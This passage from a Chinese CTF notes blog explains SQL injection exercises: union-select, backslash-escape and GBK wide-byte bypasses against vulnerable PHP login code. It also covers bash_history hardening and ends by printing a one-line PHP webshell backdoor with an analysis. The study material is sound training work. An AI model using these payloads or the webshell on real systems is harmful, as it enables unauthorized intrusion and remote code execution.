查询语句就能成功返回user列，值为admin的那条记录。 union查询源码：123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有$query[pw]的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。 例如：select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。 注意别忘记输入pass后，会对其进行MD5加密。所以构造post：user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir查询语句就变为SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;; 转义源码：1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; 分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造username=suqir\&amp;password=or%201%23使得查询语句如下 SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39; 即123456SELECT * FROM users WHERE name=&apos;suqir\&apos; AND pass=&apos; 『 [name]的值为 [&apos; AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #&apos; 『 注释掉多余的单引号 』即select * from users where false or 1 一道综合题:南邮CTF-综合题2及其writeup GBK宽字节编码漏洞(gbk_sql_injection)介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞正常情况下 magic_quote_gpc 为ON,如果输入 http://www.xxxx.com/index.php?user=11′ and 1=2 # SQL语句就会变成 SELECT * FROM user WHERE user=’1\’ and 1=2 #’ 自动加上了\转义，如果构造特殊的宽字节编码呢？ http://www.xxxx.com/index.php?user=11%df%27 and 1=2 # SQL语句就变成 SELECT * FROM user WHERE user=’11運’ and 1=2#’ 这样就注入上了！ 11%df会被解析成11運,而%27被邪恶的解析成&#39;就绕过了gpc转义,就成功构造注入了 Unix/Linux相关bash_historyBash shell在~/.bash_history（~/表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个.bash_history文件。 为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。 删除方法: 第一步：/etc/profile文件中的HISTFILESIZE和HISTSIZE行确定所有用户的.bash_history文件中可以保存的旧命令条数。强烈建议把把/etc/profile文件中的HISTFILESIZE和HISTSIZE行的值设为一个较小的数，比如30。编辑profile文件vi /etc/profile，把下面这行改为：12HISTFILESIZE=30HISTSIZE=30 这表示每个用户的.bash_history文件只可以保存30条旧命令。 第二步：网管还应该在/etc/skel/.bash_logout文件中添加下面这行rm -f $HOME/.bash_history。这样，当用户每次注销时.bash_history文件都会被删除. vi编辑器的备份文件linux下一般使用vi编辑器，并且异常退出会留下备份文件xxx.swp 一句话木马数组回调后门源码：12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 分析：利用了php中回调函数的后门，可以使www为preg_replace函数，当array_walk()将函数作用于数组时，POST传入的数据作为preg_replace()的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。 测试： 未完待续。。。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
